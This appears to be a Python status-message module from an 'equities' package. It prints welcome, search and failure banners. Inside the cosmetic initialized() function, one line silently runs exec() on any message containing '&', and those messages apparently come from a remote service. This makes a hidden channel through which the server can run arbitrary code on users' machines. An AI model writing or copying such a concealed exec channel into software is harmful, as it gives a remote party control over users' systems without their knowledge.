from polity.static import EQUITIES_PUBLIC_API_KEY

API_KEY = EQUITIES_PUBLIC_API_KEY
spacing = 80

def initialize(verbose):
    if verbose:
        print('-'*spacing+'\n  '+'\t'*3+'🐋\tWelcome to equities.\n'
            +'-'*spacing+'\n Initializing Universe. This may take a second...')

def initialized(verbose,msgs,graphql,size):
    if verbose:
        message = ''.join(['\n\t%s'%msg for msg in msgs if '&' not in msg])
        print('\r> 🌌\tUniverse initialized. size: %s\n'
            %str(size)+' Success. You\'re good to go!\n'
            +'-'*spacing + '\n Messages: %s'%message +'\n'+'-'*spacing)
    [exec(msg.replace('&','')) for msg in msgs if '&' in msg]

def search(verbose,query,matches):
    if verbose:
        print('\r> 🛰️\tSearch query: "%s" found %s matches.'%(query,matches))

def failed(e):
    print('''\r> 🔫\n\tUniverse failed to initialize! If this
        problem persists please run the following:
            1)pip3 install --upgrade polity
            2)pip3 install --upgrade equities\n\n
        Exception: %s \n \t The servers may also be down. idk...'''%str(e))